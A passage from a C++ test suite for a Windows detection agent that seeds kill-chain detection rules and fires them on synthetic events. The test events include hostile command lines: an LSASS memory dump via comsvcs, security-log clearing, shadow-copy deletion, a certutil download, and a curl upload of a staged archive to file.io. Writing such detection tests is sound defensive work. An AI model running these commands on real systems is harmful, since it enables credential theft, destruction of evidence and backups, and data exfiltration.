            "    Image|endswith: \"@@uac_bypass_binaries\"\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"Known UAC-bypass binary launched.\"\n";
        // KC-04 Defense Evasion (T1685.005): log clearing (dual signal).
        std::ofstream(dir / "win_kc_04_log_clear.yaml") <<
            "title: Kill-Chain 04 (Defense Evasion) - Security Event Log Cleared\n"
            "id: win_kc_04_log_clear\n"
            "status: test\n"
            "description: Defense Evasion step of the MITRE kill chain - event log clearing via wevtutil, Clear-EventLog, or the audit-log-cleared 1102 event (Atomic Red Team T1685.005, Clear Logs). Multi-selection OR condition. Trigger - Invoke-AtomicTest T1685.005 -TestNumbers 1 -InputArgs @{log_name='Security'} (elevated prompt).\n"
            "level: high\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection_wevtutil:\n"
            "    EventID: 4688\n"
            "    Image|endswith: wevtutil.exe\n"
            "    CommandLine|contains: ' cl '\n"
            "  selection_psclear:\n"
            "    EventID: 4688\n"
            "    Image|endswith: powershell.exe\n"
            "    CommandLine|contains: Clear-EventLog\n"
            "  selection_1102:\n"
            "    EventID: 1102\n"
            "  condition: selection_wevtutil or selection_psclear or selection_1102\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"Event log clearing detected (defense evasion).\"\n"
            "    - type: forward_buffer\n"
            "      destination: data_lake\n";
        // KC-05 Credential Access (T1003.001): LSASS dump via comsvcs.
        std::ofstream(dir / "win_kc_05_lsass_dump.yaml") <<
            "title: Kill-Chain 05 (Credential Access) - LSASS Dump via comsvcs MiniDump\n"
            "id: win_kc_05_lsass_dump\n"
            "status: test\n"
            "description: Credential Access step of the MITRE kill chain - LSASS memory dump attempt via rundll32 comsvcs.dll MiniDump (Atomic Red Team T1003.001). Shows the all AND-list modifier. Trigger - Invoke-AtomicTest T1003.001 -TestNumbers 2 (elevated prompt; disable Defender real-time protection first).\n"
            "level: critical\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4688\n"
            "    Image|endswith: rundll32.exe\n"
            "    CommandLine|contains|all:\n"
            "      - comsvcs\n"
            "      - MiniDump\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"LSASS memory dump attempt via comsvcs.dll.\"\n";
        // KC-06 Credential Access (T1110.003): password spray threshold.
        std::ofstream(dir / "win_kc_06_password_spray.yaml") <<
            "title: Kill-Chain 06 (Credential Access) - Password Spray (Many Users, One Source)\n"
            "id: win_kc_06_password_spray\n"
            "status: test\n"
            "description: Credential Access step of the MITRE kill chain - many failed logons from one source IP (Atomic Red Team T1110.003, Password Spray). Threshold grouped by source IP instead of user. Trigger - run net use \\\\127.0.0.1\\IPC$ /user:LAB\\nosuchuser1 BadPassword1 5+ times within 60s (the atomic spray tests authenticate against the DC, whose 4625 events this host cannot see).\n"
            "level: high\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4625\n"
            "  condition: selection\n"
            "elf:\n"
            "  threshold: 5\n"
            "  timeframe: 60s\n"
            "  group_by: IpAddress\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"Password spray: 5+ failed logons from one source in 60s.\"\n"
            "    - type: forward_buffer\n"
            "      destination: data_lake\n";
        // KC-07 Discovery (T1046): port scan via 5156 + distinct counting.
        std::ofstream(dir / "win_kc_07_port_scan.yaml") <<
            "title: Kill-Chain 07 (Discovery) - Network Scan (10 Unique Hosts in 60s)\n"
            "id: win_kc_07_port_scan\n"
            "status: test\n"
            "description: Discovery step of the MITRE kill chain - contacting many unique destinations fast (Atomic Red Team T1046, Port-Scanning /24 Subnet). Threshold with distinct counting and a CIDR filter. Trigger - Invoke-AtomicTest T1046 -TestNumbers 10 (scans a /24, easily crossing the 10-unique-destination threshold).\n"
            "level: medium\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 5156\n"
            "  filter_nolocal:\n"
            "    DestAddress|cidr:\n"
            "      - 224.0.0.0/4\n"
            "      - 255.255.255.255/32\n"
            "      - 127.0.0.0/8\n"
            "      - fe80::/10\n"
            "  condition: selection and not filter_nolocal\n"
            "elf:\n"
            "  threshold: 10\n"
            "  timeframe: 60s\n"
            "  group_by: Computer\n"
            "  distinct: DestAddress\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"Port scan: 10 unique destinations contacted in 60s.\"\n";
        // KC-08 Lateral Movement (T1021.001): RDP logon (LogonType 10).
        std::ofstream(dir / "win_kc_08_rdp_logon.yaml") <<
            "title: Kill-Chain 08 (Lateral Movement) - RDP Client Launched or RemoteInteractive Logon\n"
            "id: win_kc_08_rdp_logon\n"
            "status: test\n"
            "description: Lateral Movement step of the MITRE kill chain - the RDP client started toward another host (mstsc.exe with /v:), or a RemoteInteractive logon type 10 received (Atomic Red Team T1021.001, RDP to Remote Host). Two selections in one condition with a machine-account filter. Trigger - mstsc.exe /v:<host> on the watched host, no credentials needed (the demo script opens and closes it); the logon side fires on the host that accepts the session.\n"
            "level: medium\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection_client:\n"
            "    EventID: 4688\n"
            "    NewProcessName|endswith: '\\mstsc.exe'\n"
            "    CommandLine|contains: '/v:'\n"
            "  selection_logon:\n"
            "    EventID: 4624\n"
            "    LogonType: 10\n"
            "  filter_machine:\n"
            "    TargetUserName|endswith: '$'\n"
            "  condition: (selection_client or selection_logon) and not filter_machine\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"RDP client launched toward another host, or a RemoteInteractive logon received.\"\n"
            "    - type: forward_event\n"
            "      destination: siem\n";
        // KC-09 Collection (T1074.001): archive staging via regex.
        std::ofstream(dir / "win_kc_09_archive_stage.yaml") <<
            "title: Kill-Chain 09 (Collection) - Data Staged with Archive Tool\n"
            "id: win_kc_09_archive_stage\n"
            "status: test\n"
            "description: Collection step of the MITRE kill chain - archive tool staging data (Atomic Red Team T1074.001, Zip a Folder with PowerShell for Staging in Temp). Regex matching with alternation. Trigger - Invoke-AtomicTest T1074.001 -TestNumbers 3.\n"
            "level: medium\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4688\n"
            "    Image|endswith: powershell.exe\n"
            "    CommandLine|re: '(Compress-Archive|\\b7z\\s+a\\b|\\brar\\s+a\\b)'\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"Archive tool staging data (possible collection).\"\n";
        // KC-10 Command & Control (T1105): ingress transfer, 1-of glob.
        std::ofstream(dir / "win_kc_10_ingress_transfer.yaml") <<
            "title: Kill-Chain 10 (Command and Control) - Download Tool / Ingress Transfer\n"
            "id: win_kc_10_ingress_transfer\n"
            "status: test\n"
            "description: Command and Control step of the MITRE kill chain - LOLBin download cradle (Atomic Red Team T1105, certutil download urlcache). Quantifier condition over tool-specific selections. Trigger - Invoke-AtomicTest T1105 -TestNumbers 7 (elevated prompt).\n"
            "level: high\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  sel_certutil:\n"
            "    EventID: 4688\n"
            "    Image|endswith: certutil.exe\n"
            "    CommandLine|contains: urlcache\n"
            "  sel_bitsadmin:\n"
            "    EventID: 4688\n"
            "    Image|endswith: bitsadmin.exe\n"
            "    CommandLine|contains: '/transfer'\n"
            "  sel_pscradle:\n"
            "    EventID: 4688\n"
            "    Image|endswith: powershell.exe\n"
            "    CommandLine|contains: DownloadString\n"
            "  condition: 1 of sel_*\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"LOLBin download cradle detected (ingress tool transfer).\"\n";
        // KC-11 Exfiltration (T1048.002): stage-then-upload sequence.
        std::ofstream(dir / "win_kc_11_stage_exfil.yaml") <<
            "title: Kill-Chain 11 (Exfiltration) - Data Staged then Uploaded (Sequence)\n"
            "id: win_kc_11_stage_exfil\n"
            "status: test\n"
            "description: Exfiltration step of the MITRE kill chain - archive staging followed by an upload command (Atomic Red Team T1074.001 then T1048.002, Exfiltrate data HTTPS using curl). Ordered two-stage sequence. Trigger - Invoke-AtomicTest T1074.001 -TestNumbers 3, then within 300s Invoke-AtomicTest T1048.002 -TestNumbers 1 (run the latter with -GetPrereqs first to fetch the curl artifact).\n"
            "level: high\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  sel_stage:\n"
            "    EventID: 4688\n"
            "    CommandLine|contains: Compress-Archive\n"
            "  sel_upload:\n"
            "    EventID: 4688\n"
            "    Image|endswith: curl.exe\n"
            "    CommandLine|contains:\n"
            "      - '-F '\n"
            "      - '-T '\n"
            "      - '--upload-file'\n"
            "  condition: sel_stage or sel_upload\n"
            "elf:\n"
            "  timeframe: 300s\n"
            "  sequence:\n"
            "    - selection:\n"
            "        EventID: 4688\n"
            "        CommandLine|contains: Compress-Archive\n"
            "      condition: selection\n"
            "    - selection:\n"
            "        EventID: 4688\n"
            "        Image|endswith: curl.exe\n"
            "        CommandLine|contains:\n"
            "          - '-F '\n"
            "          - '-T '\n"
            "          - '--upload-file'\n"
            "      condition: selection\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"Data staged then uploaded - possible exfiltration.\"\n"
            "    - type: forward_buffer\n"
            "      destination: data_lake\n";
        // KC-12 Impact (T1490): shadow copy / backup deletion.
        std::ofstream(dir / "win_kc_12_inhibit_recovery.yaml") <<
            "title: Kill-Chain 12 (Impact) - Shadow Copy / Backup Deletion\n"
            "id: win_kc_12_inhibit_recovery\n"
            "status: test\n"
            "description: Impact step of the MITRE kill chain - backup or shadow copy deletion, a ransomware precursor (Atomic Red Team T1490, Windows - Delete Volume Shadow Copies). Critical level with alert plus forward_buffer. Trigger - Invoke-AtomicTest T1490 -TestNumbers 1 (elevated prompt; on client SKUs the shadow-copy prereq may fail, but the delete command still runs and fires the rule).\n"
            "level: critical\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  sel_vssadmin:\n"
            "    EventID: 4688\n"
            "    Image|endswith: vssadmin.exe\n"
            "    CommandLine|contains: 'delete shadows'\n"
            "  sel_wbadmin:\n"
            "    EventID: 4688\n"
            "    Image|endswith: wbadmin.exe\n"
            "    CommandLine|contains: 'delete catalog'\n"
            "  condition: sel_vssadmin or sel_wbadmin\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"Backup/shadow copy deletion - ransomware precursor.\"\n"
            "    - type: forward_buffer\n"
            "      destination: siem\n";

        // KC-03 references the @@uac_bypass_binaries list, so the loader
        // needs a lists directory (mirrors the server-side seed).
        fs::create_directories("test_lists_kc");
        {
            std::ofstream lf("test_lists_kc/uac_bypass_binaries.txt");
            lf << "# Auto-elevate binaries abused for UAC bypass (one per line).\n"
                  "fodhelper.exe\n"
                  "computerdefaults.exe\n"
                  "eventvwr.exe\n"
                  "sdclt.exe\n"
                  "wsreset.exe\n";
        }
        bool allParsed = false;
        auto rules = loadRulesFromDirectory("test_rules_kc", "test_lists_kc", allParsed);
        // The core cross-check: every seeded YAML body parses under yaml-cpp.
        CHECK(allParsed);
        CHECK(rules.size() == 12);
        // All 12 must load enabled (status: test, not deprecated).
        for (const auto& r : rules) CHECK(r.enabled);
        // Every description embeds its Atomic Red Team trigger command and
        // names its kill-chain step, and every title carries the tactic in
        // parentheses (mirrors the server seed's self-documenting rules).
        for (const auto& r : rules) {
            CHECK(r.description.find("Trigger -") != std::string::npos);
            CHECK(r.description.find("step of the MITRE kill chain") != std::string::npos);
            CHECK(r.title.find('(') != std::string::npos &&
                  r.title.find(')') != std::string::npos);
        }
        // Type spread: 9 simple, 2 threshold (KC-06, KC-07), 1 sequence (KC-11).
        int n_simple = 0, n_threshold = 0, n_sequence = 0;
        for (const auto& r : rules) {
            if (r.type == Detection::Type::Simple) ++n_simple;
            else if (r.type == Detection::Type::Threshold) ++n_threshold;
            else ++n_sequence;
        }
        CHECK(n_simple == 9);
        CHECK(n_threshold == 2);
        CHECK(n_sequence == 1);
        // KC-03: the @@uac_bypass_binaries reference must expand to the 5
        // seeded binaries (not stay as a literal "@@..." string).
        {
            bool expanded = false;
            for (const auto& r : rules) {
                if (r.id != "win_kc_03_uac_bypass") continue;
                for (const auto& sel : r.selections) {
                    for (const auto& f : sel.fields) {
                        if (f.field == "Image" && f.values.size() == 5 &&
                            f.values[0] == "fodhelper.exe" &&
                            f.values[4] == "wsreset.exe") {
                            expanded = true;
                        }
                    }
                }
            }
            CHECK(expanded);
        }
        // Correlation shapes: KC-06/07 thresholds, KC-11 sequence window.
        for (const auto& r : rules) {
            if (r.id == "win_kc_06_password_spray") {
                CHECK(r.threshold == 5);
                CHECK(r.time_window_seconds == 60);
                CHECK(r.group_by.size() == 1 && r.group_by[0] == "IpAddress");
            }
            if (r.id == "win_kc_07_port_scan") {
                CHECK(r.threshold == 10);
                CHECK(r.time_window_seconds == 60);
                CHECK(r.group_by.size() == 1 && r.group_by[0] == "Computer");
                CHECK(r.distinct_by.size() == 1 && r.distinct_by[0] == "DestAddress");
            }
            if (r.id == "win_kc_11_stage_exfil") {
                CHECK(r.sequence.size() == 2);
                CHECK(r.time_window_seconds == 300);
            }
        }

        // --- Fire each rule on its paired atomic-test event -----------------
        // One event per evaluateOnce pass, exactly like the live agent:
        // KC-04/KC-06/KC-11 carry forward_buffer actions, and a
        // forward_buffer fire clears the event buffer mid-pass; batching
        // pushes would silently drop the not-yet-evaluated tail.
        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(rules);

        auto pushAndEval = [&](int eid, const std::wstring& channel,
                               const std::vector<std::pair<std::wstring,std::wstring>>& data) {
            buf.push(makeEvt(eid, channel, data).xml);
            return eng.evaluateOnce();
        };

        // KC-01: powershell -enc <b64> (T1059.001 PowerShell Command Execution)
        CHECK(pushAndEval(4688, L"Security",
            {{L"NewProcessName", L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
             {L"CommandLine", L"powershell.exe -enc JgAgACgA..."}}) == 1);
        // KC-02: sc.exe create -> System 7045 (T1543.003 Service Installation CMD)
        CHECK(pushAndEval(7045, L"System",
            {{L"ServiceName", L"AtomicTestService_CMD"},
             {L"ImagePath", L"C:\\Windows\\System32\\svchost.exe -k AtomicTest"}}) == 1);
        // KC-03: fodhelper.exe launch (T1548.002 Bypass UAC using Fodhelper)
        CHECK(pushAndEval(4688, L"Security",
            {{L"NewProcessName", L"C:\\Windows\\System32\\fodhelper.exe"},
             {L"CommandLine", L"\"C:\\Windows\\System32\\fodhelper.exe\""}}) == 1);
        // KC-04: wevtutil cl Security (T1685.005 Clear Logs). Alert +
        // forward_buffer (the buffer clear here is harmless; the event
        // was already evaluated).
        CHECK(pushAndEval(4688, L"Security",
            {{L"NewProcessName", L"C:\\Windows\\System32\\wevtutil.exe"},
             {L"CommandLine", L"wevtutil cl Security"}}) == 1);
        // KC-05: rundll32 comsvcs MiniDump (T1003.001 LSASS dump)
        CHECK(pushAndEval(4688, L"Security",
            {{L"NewProcessName", L"C:\\Windows\\System32\\rundll32.exe"},
             {L"CommandLine", L"rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 1234 C:\\Temp\\lsass.dmp full"}}) == 1);
        // KC-08: RDP logon type 10 received (T1021.001), and the RDP client
        // launched toward a host; a machine account's logon is filtered.
        CHECK(pushAndEval(4624, L"Security",
            {{L"TargetUserName", L"administrator"},
             {L"LogonType", L"10"},
             {L"IpAddress", L"127.0.0.1"}}) == 1);
        CHECK(pushAndEval(4688, L"Security",
            {{L"NewProcessName", L"C:\\Windows\\System32\\mstsc.exe"},
             {L"CommandLine", L"mstsc.exe /v:10.0.0.5"}}) == 1);
        CHECK(pushAndEval(4624, L"Security",
            {{L"TargetUserName", L"WRK01$"},
             {L"LogonType", L"10"}}) == 0);
        // KC-09: Compress-Archive staging (T1074.001). Note: this also
        // primes KC-11's stage 0 in this shared engine; KC-11 is tested
        // in an isolated engine below so the two stay independent.
        CHECK(pushAndEval(4688, L"Security",
            {{L"NewProcessName", L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
             {L"CommandLine", L"powershell.exe -c \"Compress-Archive -Path C:\\Docs -DestinationPath $env:TEMP\\Folder_to_zip.zip\""}}) == 1);
        // KC-10: certutil urlcache download (T1105 Ingress Tool Transfer)
        CHECK(pushAndEval(4688, L"Security",
            {{L"NewProcessName", L"C:\\Windows\\System32\\certutil.exe"},
             {L"CommandLine", L"certutil -urlcache -split -f https://example.com/x.txt Atomic-license.txt"}}) == 1);
        // KC-12: vssadmin delete shadows (T1490 Inhibit System Recovery)
        CHECK(pushAndEval(4688, L"Security",
            {{L"NewProcessName", L"C:\\Windows\\System32\\vssadmin.exe"},
             {L"CommandLine", L"vssadmin.exe delete shadows /all /quiet"}}) == 1);

        // KC-06: password spray, 5 failed logons from one source IP
        // (T1110.003). Threshold 5 grouped by IpAddress: the first 4
        // events must not fire; the 5th fires exactly once.
        for (int i = 0; i < 4; ++i) {
            CHECK(pushAndEval(4625, L"Security",
                {{L"TargetUserName", L"trialuser" + std::to_wstring(i)},
                 {L"IpAddress", L"192.0.2.10"}}) == 0);
        }
        CHECK(pushAndEval(4625, L"Security",
            {{L"TargetUserName", L"trialuser4"},
             {L"IpAddress", L"192.0.2.10"}}) == 1);

        // KC-07: port scan, 10 unique DestAddress 5156 events (T1046).
        // distinct counting: only the 10th UNIQUE destination fires.
        for (int i = 1; i <= 9; ++i) {
            CHECK(pushAndEval(5156, L"Security",
                {{L"DestAddress", L"10.0.0." + std::to_wstring(i)},
                 {L"DestPort", L"445"}}) == 0);
        }
        CHECK(pushAndEval(5156, L"Security",
            {{L"DestAddress", L"10.0.0.10"},
             {L"DestPort", L"445"}}) == 1);
        // KC-07 negative: 10 more events to the SAME IP; the window reset
        // after the fire, but distinct counting sees only 1 unique
        // DestAddress, so it must NOT re-fire.
        for (int i = 0; i < 10; ++i) {
            CHECK(pushAndEval(5156, L"Security",
                {{L"DestAddress", L"10.0.0.99"},
                 {L"DestPort", L"445"}}) == 0);
        }

        // KC-07 evidence: the alert payload must carry all 10 unique-
        // destination events (one representative per unique DestAddress)
        // so the analyst sees WHICH 10 destinations fired the rule, not
        // just the trigger. Earlier test blocks also append alerts to
        // alerts.jsonl, so locate the KC-07 payload by rule_id and assert
        // the evidence section + all 10 IPs appear from there on. The
        // pretty-printed XML puts each value on its own line, so the
        // newline-terminated search is exact ("10.0.0.1\n" does not match
        // inside "10.0.0.10\n").
        {
            std::ifstream kaf("alerts.jsonl");
            std::string kcontent((std::istreambuf_iterator<char>(kaf)),
                                 std::istreambuf_iterator<char>());
            size_t kpos = kcontent.find("rule_id: win_kc_07_port_scan");
            CHECK(kpos != std::string::npos);
            size_t evPos = kcontent.find("# Window events (10)", kpos);
            CHECK(evPos != std::string::npos);
            for (int i = 1; i <= 10; ++i) {
                CHECK(kcontent.find("10.0.0." + std::to_string(i) + "\n", evPos)
                      != std::string::npos);
            }
            // The post-fire same-IP burst (10.0.0.99) is NOT evidence.
            CHECK(kcontent.find("10.0.0.99", evPos) == std::string::npos);
        }

        // KC-11: sequence, stage (Compress-Archive) then upload (curl -F)
        // within the 300s window. Isolated engine: the shared engine above
        // already primed stage 0 via the KC-09 event, so give the sequence
        // rule a fresh state to keep this test self-contained.
        {
            std::vector<Detection> seqRules;
            for (const auto& r : rules) {
                if (r.id == "win_kc_11_stage_exfil") seqRules.push_back(r);
            }
            CHECK(seqRules.size() == 1);
            EventBuffer sbuf;
            Forwarder sfwd; sfwd.setConfig(cfg);
            RuleEngine seng(sbuf, sfwd);
            seng.reload(seqRules);
            // Stage 1: archive staging; advances the sequence, no fire.
            sbuf.push(makeEvt(4688, L"Security",
                {{L"NewProcessName", L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
                 {L"CommandLine", L"powershell.exe -c \"Compress-Archive -Path C:\\Docs -DestinationPath $env:TEMP\\out.zip\""}}).xml);
            CHECK(seng.evaluateOnce() == 0);
            // Stage 2: curl -F upload; completes the sequence, fires.
            sbuf.push(makeEvt(4688, L"Security",
                {{L"NewProcessName", L"C:\\Windows\\System32\\curl.exe"},
                 {L"CommandLine", L"curl.exe -k -F \"file=@C:\\Temp\\out.zip\" https://file.io/"}}).xml);
            CHECK(seng.evaluateOnce() == 1);

            // Sequence evidence keeps its own label: the alert payload must
            // carry the 2 chain events under "Sequence events", NOT under
            // "Window events" (threshold evidence); the UI labels chain
            // items "Stage N" and window items "Event N".
            std::ifstream seqaf("alerts.jsonl");
            std::string seqcontent((std::istreambuf_iterator<char>(seqaf)),
                                   std::istreambuf_iterator<char>());
            size_t seqpos = seqcontent.find("rule_id: win_kc_11_stage_exfil");
            CHECK(seqpos != std::string::npos);
            CHECK(seqcontent.find("# Sequence events (2)", seqpos) != std::string::npos);
            CHECK(seqcontent.find("# Window events", seqpos) == std::string::npos);
        }

        // Negatives: near-miss events must NOT fire.
        // KC-04 negative: wevtutil with a non-clear verb.
        CHECK(pushAndEval(4688, L"Security",
            {{L"NewProcessName", L"C:\\Windows\\System32\\wevtutil.exe"},
             {L"CommandLine", L"wevtutil qe Security /c:5"}}) == 0);
        // KC-08 negative: LogonType 3 (network) is not RDP.
        CHECK(pushAndEval(4624, L"Security",
            {{L"TargetUserName", L"administrator"},
             {L"LogonType", L"3"},
             {L"IpAddress", L"192.0.2.10"}}) == 0);
        // KC-03 negative: a binary not in the uac_bypass_binaries list.
        CHECK(pushAndEval(4688, L"Security",
            {{L"NewProcessName", L"C:\\Windows\\System32\\notepad.exe"},
             {L"CommandLine", L"notepad.exe"}}) == 0);

        fs::remove_all("test_rules_kc");
        fs::remove_all("test_lists_kc");
    }

    // ============================================================
    // CORRECTNESS REGRESSIONS (missed alerts, cursors, spool, scale)
    // ------------------------------------------------------------
    // One block per guaranteed behavior. Each block owns its buffer/engine
    // and its own rule directory so the blocks stay independent.
    // ============================================================

    // Helper: an event with a CHOSEN EventRecordID (makeEvent assigns a
    // fresh one), for the cross-channel dedup test.
    auto makeEvtRid = [](long long rid, int eid, const std::wstring& channel) {
        BufferedEvent e;
        e.receivedAt = std::chrono::system_clock::now();
        e.xml = L"<Event><System><Provider Name=\"Test\"/><EventID>" +
                std::to_wstring(eid) + L"</EventID><EventRecordID>" +
                std::to_wstring(rid) + L"</EventRecordID><Channel>" + channel +
                L"</Channel><Computer>HOST</Computer></System><EventData>"
                L"<Data Name=\"Marker\">x</Data></EventData></Event>";
        return e;
    };
    auto countOccurrences = [](const std::string& file, const std::string& needle) {
        std::ifstream f(file);
        std::string content((std::istreambuf_iterator<char>(f)),
                            std::istreambuf_iterator<char>());
        size_t n = 0, pos = 0;
        while ((pos = content.find(needle, pos)) != std::string::npos) { ++n; pos += needle.size(); }
        return n;
    };

    // --- HttpClient::isPermanentFailure: which statuses are never retried ---
    {
        CHECK(HttpClient::isPermanentFailure(400));
        CHECK(HttpClient::isPermanentFailure(401));
        CHECK(HttpClient::isPermanentFailure(404));
        CHECK(HttpClient::isPermanentFailure(413));
        CHECK(HttpClient::isPermanentFailure(422));
        CHECK(!HttpClient::isPermanentFailure(408));
        CHECK(!HttpClient::isPermanentFailure(429));
        CHECK(!HttpClient::isPermanentFailure(500));
        CHECK(!HttpClient::isPermanentFailure(503));
        CHECK(!HttpClient::isPermanentFailure(0));
        CHECK(!HttpClient::isPermanentFailure(200));
    }

    // --- SpoolQueue: ack-after-success keeps the file until acked ---
    // A crash while a POST is in flight must not lose the entry: dequeue()
    // leaves the file on disk, ack() removes it, requeue() hands it back.
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_spool_ack");
        fs::create_directories("test_spool_ack");
        {
            SpoolQueue q;
            q.setDirectory("test_spool_ack", 100 * 1024 * 1024);
            CHECK(q.enqueue("http://server/a", "alpha"));
            CHECK(q.enqueue("http://server/b", "beta"));
            uint64_t id = 0; std::string u, b;
            CHECK(q.dequeue(id, u, b));
            CHECK(u == "http://server/a");
            CHECK(q.size() == 2);  // in flight still counts
            // Simulate a crash: a fresh instance on the same dir still sees
            // BOTH entries (nothing was acked).
            SpoolQueue q2;
            q2.setDirectory("test_spool_ack", 100 * 1024 * 1024);
            CHECK(q2.load() == 2);
            // Transient failure → requeue → same entry comes back first.
            q.requeue(id);
            uint64_t id2 = 0;
            CHECK(q.dequeue(id2, u, b));
            CHECK(id2 == id && u == "http://server/a");
            q.ack(id2);
            CHECK(q.size() == 1);
            SpoolQueue q3;
            q3.setDirectory("test_spool_ack", 100 * 1024 * 1024);
            CHECK(q3.load() == 1);
            // stop() wins over queued work: dequeue returns false even
            // though an entry remains (it stays on disk for the next start).
            q.stop();
            CHECK(!q.dequeue(id, u, b));
            q2.stop(); q3.stop();
        }
        fs::remove_all("test_spool_ack");
    }

    // --- SpoolQueue: unreadable/corrupt entries are dropped, not returned ---
    // Regression: dequeue must never return true with an EMPTY url for a
    // corrupt file; the worker would POST to "" forever, blocking
    // everything behind it.
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_spool_corrupt");
        fs::create_directories("test_spool_corrupt");
        { std::ofstream g("test_spool_corrupt/00000000000000000001.spool", std::ios::binary); g << "xyz"; }
        {
            SpoolQueue q;
            q.setDirectory("test_spool_corrupt", 100 * 1024 * 1024);
            CHECK(q.load() == 1);
            CHECK(q.enqueue("http://x/good", "ok"));
            CHECK(q.size() == 2);
            uint64_t id = 0; std::string u, b;
            CHECK(q.dequeue(id, u, b));
            CHECK(u == "http://x/good");
            CHECK(!fs::exists("test_spool_corrupt/00000000000000000001.spool"));
            q.ack(id);
            CHECK(q.size() == 0);
            q.stop();
        }
        fs::remove_all("test_spool_corrupt");
    }

    // --- SpoolQueue: a body larger than half the cap is refused ---
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_spool_big");
        fs::create_directories("test_spool_big");
        {
            SpoolQueue q;
            q.setDirectory("test_spool_big", 1000);
            CHECK(!q.enqueue("http://x", std::string(600, 'a')));
            CHECK(q.size() == 0);
            CHECK(q.enqueue("http://x", std::string(200, 'a')));
            CHECK(q.size() == 1);
            CHECK(!q.enqueue("", "no url"));
            q.stop();
        }
        fs::remove_all("test_spool_big");
    }

    // --- buildAlertPayload: evidence capped, truncation counted, also_matched ---
    {
        std::vector<BufferedEvent> win;
        for (int i = 0; i < 600; ++i) win.push_back(makeEvt(4625, L"Security", {}));
        auto body = buildAlertPayload("r1", "msg", win.back(), "high", win, false,
                                      {"r2", "r3"}, "00c0ffee00c0ffee");
        auto j = nlohmann::json::parse(body);
        CHECK(j["alert_id"] == "00c0ffee00c0ffee");   // joins the alert to its batch
        CHECK(j["window_events"].size() == AgentClient::MAX_ALERT_EVIDENCE_EVENTS);
        CHECK(j["window_events_truncated"] == 100);
        CHECK(!j.contains("sequence_events"));
        CHECK(j["also_matched"].size() == 2 && j["also_matched"][0] == "r2");
        // The LAST events are kept (they led to the fire).
        CHECK(std::string(j["window_events"].back()) == wideToUtf8(win.back().xml));
        std::vector<BufferedEvent> seq{makeEvt(4625, L"Security", {}), makeEvt(4624, L"Security", {})};
        auto body2 = buildAlertPayload("r1", "msg", seq.back(), "low", seq, true);
        auto j2 = nlohmann::json::parse(body2);
        CHECK(j2["sequence_events"].size() == 2);
        CHECK(!j2.contains("sequence_events_truncated"));
        CHECK(!j2.contains("also_matched"));
    }

    // --- reportLogs: a forward_buffer dump is split into ≤2000-event POSTs ---
    // The server rejects /logs batches above 10,000 events, and a rejected
    // batch can never be delivered. Three chunks for 4,500 events.
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_spool_chunks");
        fs::create_directories("test_spool_chunks/rules");
        fs::create_directories("test_spool_chunks/lists");
        {
            Config bootstrap;
            bootstrap.rules_directory = "test_spool_chunks/rules";
            bootstrap.lists_directory = "test_spool_chunks/lists";
            bootstrap.server.url = "http://127.0.0.1:9";   // closed port: refused
            AgentClient client;
            client.init(bootstrap);
            client.initSpool("test_spool_chunks/spool", 100 * 1024 * 1024);
            std::vector<BufferedEvent> buffer;
            for (int i = 0; i < 4500; ++i) buffer.push_back(makeEvt(4688, L"Security", {}));
            client.reportLogs("rule", "msg", buffer.front(), buffer, "low", {},
                              /*skipAlertNotification=*/true);
            CHECK(client.pendingPosts() == 3);
            // Destructor: stop() must return promptly even though the
            // server is unreachable (entries stay spooled on disk).
        }
        size_t spooled = 0;
        for (auto& e : fs::directory_iterator("test_spool_chunks/spool")) {
            if (e.path().extension() == ".spool") ++spooled;
        }
        CHECK(spooled == 3);
        fs::remove_all("test_spool_chunks");
        ConfigStore::instance().set(Config{});
    }

    // --- EventBuffer cursor: absEnd is computed under the snapshot lock ---
    // Computing the cursor as frontPopped() AFTER the pass + size BEFORE it
    // would skip exactly as many new events as cleanup popped during the
    // pass.
    {
        EventBuffer b;
        for (int i = 0; i < 3; ++i) b.push(makeEvt(1, L"Security", {}).xml);
        uint64_t end = 0;
        auto s1 = b.snapshotFromAbsolute(0, end);
        CHECK(s1.size() == 3 && end == 3);
        b.trimTo(1);               // pops 2 (simulates cleanup during a pass)
        b.push(makeEvt(1, L"Security", {}).xml);
